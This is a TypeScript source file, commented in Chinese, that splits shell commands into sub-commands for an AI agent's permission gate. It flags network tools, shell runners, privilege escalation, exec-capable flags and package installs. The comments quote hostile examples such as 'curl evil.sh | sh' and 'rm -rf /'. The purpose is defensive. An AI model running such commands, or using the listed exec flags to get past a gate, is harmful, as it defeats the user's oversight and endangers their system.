/**
 * shell 命令拆句器 —— 门卫的前置,安全价值的一半在这里。
 *
 * ── 为什么必须拆句 ──
 * 只对整条命令串做一次通配匹配等于没有门卫:`git status && curl evil.sh | sh`
 * 会被 `git *` 这条规则直接放过。必须拆成子命令逐条独立评估,任一条 deny
 * 则整体 deny。
 *
 * ── 为什么不用正则 ──
 * `echo "a; rm -rf /"` 里的分号在引号内,正则切分会把它当分隔符,于是
 * `rm -rf /` 变成一条「独立命令」——看起来更严格,实际制造了误报;反过来
 * `echo 'a && b'` 也会被切错。必须做引号状态跟踪。
 *
 * ── 为什么不用 tree-sitter ──
 * opencode 用 web-tree-sitter + tree-sitter-bash.wasm。那是正确做法,但要
 * 拖一个 wasm 依赖进单文件二进制。这里用手写单遍扫描器顶,**契约与将来换
 * tree-sitter 时保持一致**(输入 string,输出 segments + 风险标记)。
 *
 * ── fail closed ──
 * 任何解析不确定(引号未闭合、深度不为零、here-doc、进程替换)一律:
 * 整条命令强制 ask + 禁止 always。宁可多问,不可放行。
 */

export interface Segment {
  /** 子命令原文,用作权限 pattern */
  raw: string
  /** 分词结果,用于 arity 归约与首 token 判定 */
  tokens: string[]
}

export interface ScanResult {
  segments: Segment[]
  /** 解析是否完整可信。false 时 forceAsk 必为 true。 */
  parseOk: boolean
  /** 跳过 allow 判定,强制询问 */
  forceAsk: boolean
  /** 禁止用户选 always(归约不可信时) */
  forbidAlways: boolean
  /** 触发 forceAsk 的原因,给 UI 显示 */
  reasons: string[]
}

/** 提权 / 间接执行 —— 基于命令名的白名单对它们天生失效。 */
const INDIRECT_EXEC = new Set([
  "sudo",
  "doas",
  "su",
  "eval",
  "exec",
  "xargs",
  "env",
  "nohup",
  "timeout",
  "watch",
  "command",
  "builtin",
  "source",
  ".",
])

/** 会起子 shell 跑任意字符串的。 */
const SHELL_RUNNERS = new Set(["sh", "bash", "zsh", "dash", "ksh", "fish", "busybox"])

/** 出网 —— 既能拉进来也能传出去。 */
const NETWORK = new Set(["curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "telnet"])

/**
 * 表面只读、但**带上某个开关就会起别的程序**的那几个。
 *
 * ★ 这张表的存在理由:`find` / `rg` / `sort` 在 rules.ts 的只读白名单里,而它们
 *   在**不带**这些开关时确实是天天要用的只读命令 —— 把名字整个删掉换来的是审批
 *   疲劳,而疲劳的用户会把权限模式整个关掉。所以判据分两处:名字在 rules.ts,
 *   参数在这里。命中就 forceAsk,直接盖过那边的 allow。
 *
 * 每一条都验过是真能执行,不是理论上的:
 *   find -exec/-execdir/-ok/-okdir  起任意程序;-delete/-fprintf 写文件
 *   rg  --pre / --pre-glob          对每个文件先跑一遍你给的程序
 *   sort --compress-program         临时文件够大时跑它(小输入不触发,别据此以为安全)
 *   grep --devices/-D               读设备文件,能挂住或读到不该读的
 *
 * ⚠ 前缀匹配 —— `--pre=/tmp/x` 和 `--pre /tmp/x` 都要认。
 */
const EXEC_FLAGS: Record<string, readonly string[]> = {
  find: ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprintf", "-fprint", "-fls"],
  rg: ["--pre", "--pre-glob", "--hostname-bin", "--search-zip", "-z"],
  grep: ["--devices"],
  sort: ["--compress-program", "--files0-from"],
  // 不在只读白名单里,但同样是「一个开关变成执行」,写在这儿免得下次有人往表里加
  tar: ["--use-compress-program", "--to-command", "-I"],
  zip: ["-TT", "--unzip-command"],
  xz: ["--files"],
}

/** 包管理器写操作:能执行任意 postinstall 脚本 = 任意代码执行。 */
const PACKAGE_WRITE: Array<[string, string[]]> = [
  ["npm", ["i", "install", "ci", "add", "exec", "create"]],
  ["pnpm", ["i", "install", "add", "dlx", "create"]],
  ["yarn", ["add", "install", "dlx", "create"]],
  ["bun", ["i", "install", "add", "x", "create"]],
  ["pip", ["install"]],
  ["pip3", ["install"]],
  ["uv", ["pip", "add", "sync"]],
  ["cargo", ["install", "add"]],
  ["go", ["install", "get"]],
  ["gem", ["install"]],
  ["brew", ["install", "upgrade", "tap"]],
  ["apt", ["install"]],
  ["apt-get", ["install"]],
  ["composer", ["require", "install"]],
]

export function scan(command: string): ScanResult {
  const reasons: string[] = []
  const segments: Segment[] = []

  let parseOk = true
  let current = ""
  let depth = 0
  let inSingle = false
  let inDouble = false
  let escaped = false
  let sawRedirect = false
  let sawPipe = false
  let sawSubshell = false
  let sawHeredoc = false
  let sawProcessSub = false

  const flush = () => {
    const raw = current.trim()
    current = ""
    if (raw.length === 0) return
    segments.push({ raw, tokens: tokenize(raw) })
  }

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!
    const next = command[i + 1]

    if (escaped) {
      current += ch
      escaped = false
      continue
    }
    if (ch === "\\" && !inSingle) {
      current += ch
      escaped = true
      continue
    }
    if (inSingle) {
      current += ch
      if (ch === "'") inSingle = false
      continue
    }
    if (inDouble) {
      // 双引号内的 $( ) 仍然是命令替换,必须计入
      if (ch === "$" && next === "(") {
        depth++
        sawSubshell = true
        current += "$("
        i++
        continue
      }
      if (ch === ")" && depth > 0) depth--
      if (ch === "`") sawSubshell = true
      current += ch
      if (ch === '"') inDouble = false
      continue
    }

    if (ch === "'") {
      inSingle = true
      current += ch
      continue
    }
    if (ch === '"') {
      inDouble = true
      current += ch
      continue
    }
    if (ch === "`") {
      sawSubshell = true
      current += ch
      continue
    }
    if (ch === "$" && next === "(") {
      depth++
      sawSubshell = true
      current += "$("
      i++
      continue
    }
    if (ch === "(" ) {
      // 进程替换 <(...) / >(...) 前一个字符是 < 或 >
      const prev = command[i - 1]
      if (prev === "<" || prev === ">") sawProcessSub = true
      depth++
      current += ch
      continue
    }
    if (ch === ")") {
      if (depth > 0) depth--
      else parseOk = false // 括号不配对
      current += ch
      continue
    }

    if (depth > 0) {
      current += ch
      continue
    }

    // ── 到这里:depth 0、不在引号内,才允许切分 ──

    if (ch === "<" && next === "<") {
      sawHeredoc = true
      current += ch
      continue
    }
    if (ch === "<" || ch === ">") {
      sawRedirect = true
      current += ch
      continue
    }
    if (ch === "&" && next === "&") {
      flush()
      i++
      continue
    }
    if (ch === "|" && next === "|") {
      flush()
      i++
      continue
    }
    if (ch === "|") {
      sawPipe = true
      flush()
      continue
    }
    if (ch === ";" || ch === "\n") {
      flush()
      continue
    }
    if (ch === "&") {
      // 后台执行:切段,但标记 —— 后台进程逃出我们的超时与 kill
      flush()
      reasons.push("runs in the background (&) — the child can outlive the timeout and escape interruption")
      continue
    }

    current += ch
  }
  flush()

  if (inSingle || inDouble) {
    parseOk = false
    reasons.push("unbalanced quotes — could not split into sub-commands, authorising the whole line as written")
  }
  if (escaped) {
    parseOk = false
    reasons.push("ends in an unfinished escape — could not split into sub-commands, authorising the whole line as written")
  }
  if (depth !== 0) {
    parseOk = false
    reasons.push("unbalanced parentheses — could not split into sub-commands, authorising the whole line as written")
  }
  if (sawHeredoc) {
    parseOk = false
    reasons.push("contains a here-doc (<<) — could not split into sub-commands, authorising the whole line as written; its body is in the text above")
  }
  if (sawProcessSub) {
    parseOk = false
    reasons.push("contains process substitution (<(...) / >(...)) — could not split into sub-commands, authorising the whole line as written")
  }

  if (sawSubshell) reasons.push("contains command substitution ($(...) or backticks)")
  if (sawRedirect) reasons.push("redirects a file (< / > / >>)")
  // ★ 管道**不**强制询问。
  //
  // 它曾经在这张单子上,代价比想象中大得多:`rg foo src | head -20` 每次都弹框,
  // 于是工具说明里只好写「优先用不带管道的简单命令」,而模型照做之后就再也不会
  // 抓取,只会把整个文件倒出来自己看 —— 用户看到的现象是「它用 bash 很生硬」。
  //
  // 而管道本身并不多给一分权限:每一段都作为独立子命令过同一张规则表,
  // `| sh`、`| curl` 那几段会各自被自己的理由拦下;读凭据再外传是硬名单
  // (credential-exfil / credential-cat)在这之前就短路的,和管道无关。
  // 管道唯一多出来的是**段与段之间的数据流**,而流向的那一段照样要过授权。
  //
  // forbidAlways 仍然保留 sawPipe(见下面):归约出来的 always 规则代表不了
  // 整条管道,「以后都放行」这种长期授权不该建立在一个可能不准的 pattern 上。

  for (const segment of segments) {
    const first = segment.tokens[0]
    if (!first) continue
    if (first.includes("/")) {
      reasons.push(`invoked by path rather than by name: ${first}`)
      continue
    }
    if (INDIRECT_EXEC.has(first)) reasons.push(`elevates privileges or runs something indirectly: ${first}`)
    if (SHELL_RUNNERS.has(first)) reasons.push(`invokes a shell directly: ${first}`)
    if (NETWORK.has(first)) reasons.push(`reaches the network: ${first}`)
    if (first === "git" && segment.tokens[1] === "push") reasons.push("pushes to a remote")
    // 名字过了,再看参数:只读命令带上某个开关就成了执行原语
    const execFlags = EXEC_FLAGS[first]
    if (execFlags) {
      for (const token of segment.tokens.slice(1)) {
        const flag = execFlags.find((f) => token === f || token.startsWith(`${f}=`))
        if (flag) {
          reasons.push(`runs another program or writes files: ${first} ${flag}`)
          break
        }
      }
    }
    for (const [cmd, subs] of PACKAGE_WRITE) {
      if (first === cmd && segment.tokens[1] && subs.includes(segment.tokens[1])) {
        reasons.push(`package manager write (install scripts can run arbitrary code): ${first} ${segment.tokens[1]}`)
      }
    }
  }

  const forceAsk = !parseOk || reasons.length > 0
  return {
    segments,
    parseOk,
    forceAsk,
    // 解析不可信时,归约出来的 always pattern 也不可信
    forbidAlways: !parseOk || sawSubshell || sawRedirect || sawPipe,
    reasons: [...new Set(reasons)],
  }
}

/** 分词:按空白切,保留引号内整体。只用于 arity 归约与首 token 判定。 */
function tokenize(raw: string): string[] {
  const tokens: string[] = []
  let current = ""
  let inSingle = false
  let inDouble = false
  let escaped = false
  let started = false

  for (const ch of raw) {
    if (escaped) {
      current += ch
      escaped = false
      continue
    }
    if (ch === "\\" && !inSingle) {
      escaped = true
      continue
    }
    if (inSingle) {
      if (ch === "'") inSingle = false
      else current += ch
      continue
    }
    if (inDouble) {
      if (ch === '"') inDouble = false
      else current += ch
      continue
    }
    if (ch === "'") {
      inSingle = true
      started = true
      continue
    }
    if (ch === '"') {
      inDouble = true
      started = true
      continue
    }
    if (/\s/.test(ch)) {
      if (current.length > 0 || started) {
        tokens.push(current)
        current = ""
        started = false
      }
      continue
    }
    current += ch
    started = true
  }
  if (current.length > 0 || started) tokens.push(current)
  return tokens
}
